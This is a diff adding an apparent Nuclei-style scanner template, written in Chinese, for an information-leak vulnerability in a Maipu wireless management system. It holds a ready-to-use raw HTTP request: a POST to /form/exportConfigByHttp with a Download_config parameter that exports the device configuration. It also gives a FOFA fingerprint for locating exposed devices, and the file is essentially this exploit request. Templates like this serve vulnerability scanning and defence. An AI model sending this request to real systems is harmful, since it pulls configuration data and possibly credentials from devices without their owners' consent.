@@ -1,0 +1,24 @@
+id: poc-al79mmcctqigz3qz
+info:
+  name: 迈普无线管理系统存在信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/al79mmcctqigz3qz'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: al79mmcctqigz3qz
+    fofa: fid="RXaCdQdVOS1+i76LqOo2aw=="
+http:
+- raw:
+  - 'POST /form/exportConfigByHttp HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    Download_config=%E5%AF%BC%E5%87%BA'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
